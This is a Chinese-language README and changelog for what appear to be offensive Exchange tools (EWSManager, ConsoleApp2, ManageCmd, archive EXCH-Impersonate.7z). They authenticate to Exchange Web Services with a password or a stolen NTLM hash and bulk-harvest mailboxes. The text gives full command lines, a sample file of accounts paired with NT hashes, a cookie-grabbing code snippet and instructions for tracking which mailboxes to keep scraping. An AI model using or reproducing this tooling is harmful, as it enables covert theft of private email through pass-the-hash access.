密码都是1

## 更新 2023-10-10

针对单个用户

```
.\EWSManagerForSingleUser
```



```
ConsoleApp2.exe C:\Users\Administrator\Release\1.txt 127.0.0.1 2020-01-01 10
```

起始时间只支持年月日，不支持精确到时分秒

C:\Users\Administrator\Release\1.txt使用用户名和密码文件，示例：

```
Administrator@test.local:D9E23CB21C898957D8F409745C3818FB
maiul1@test.local:061C54F1F5311E1F47958465E16BAB65
maiul2@test.local:qwe123...
```

如果当前目录下存在config.ini，则不会再自行生成ini文件

如果不存在，则自行生成config.ini，每个用户的邮件收取完成后，会自动更新时间戳为收到的邮件的最新时间戳

因此需要保留好config.ini文件


## 更新 2023-03-28

```
EXCH-Impersonate.7z
```



用法做了变动，ewsurl参数现在只需要提供一个IP或者域名就行了，如：

```
EWSManager.exe user password|nthash exch_srv_ip config_dir
```

对于明文密码的bug，我懒得调了，直接加了一个明文转hash的函数，转过去就行了，全都是走ntlm认证


## 更新

### 用法：

```
EWSManager.exe user password|nthash mail_url config_dir
```

使用示例：

- 明文密码认证

  - ```
    EWSManager.exe imp@a.lab 123456 https://127.0.0.1 C:\users\public\config
    ```

- nt hash认证

  - ```
    EWSManager.exe imp@a.lab :nthash https://127.0.0.1 C:\users\public\config
    ```

  

最终所有抓取下来的邮件会被放到当前目录下的`archived_email`目录中



### 配置文件的生成方法

- 添加： 

     - 将用户`receiver@a.lab`，加入配置文件，下面的命令表示，抓取邮箱用户`receiver@a.lab`从`2023.01.01`之日起的邮件，最多抓取100封

     - ```
          ManageCmd.exe -i receiver@a.lab 10 2023-01-01-00-00-00
          ```

- 删除：

     - 将用户`receiver@a.lab`从配置文件中删除，后续将不再抓取该用户的邮件

     - ```
          ManageCmd.exe -d receiver@a.lab
          ```

- 查看当前配置：

     - ```
          ManageCmd.exe -o
          ```






## 2023-03-07

目前仍处于测试阶段，仅支持如下用法：

consoleapp2.exe -CerValidation No -ExchangeVersion Exchange2010_SP1 -u receiver@a.lab -p 061c54f1f5311e1f47958465e16bab65 -ewsPath https://192.168.87.137/ews/exchange.asmx -Mode ListMail -Folder Inbox

使用的时候，需要先使用提供的凭据认证一次，获取到可用的cookie并写入文件之后，就可以执行正常的操作了，如下代码所示

```
try
{
	int unRsdsdead = Folder.Bind(service, WellKnownFolderName.Inbox).UnreadCount;
}

catch (Exception e)
{
	int asd = 1;
}
```

上面这一段代码可以写在main函数的最开始的地方，并不进行其他的操作，仅仅是用于使用NTLM认证获取cookie
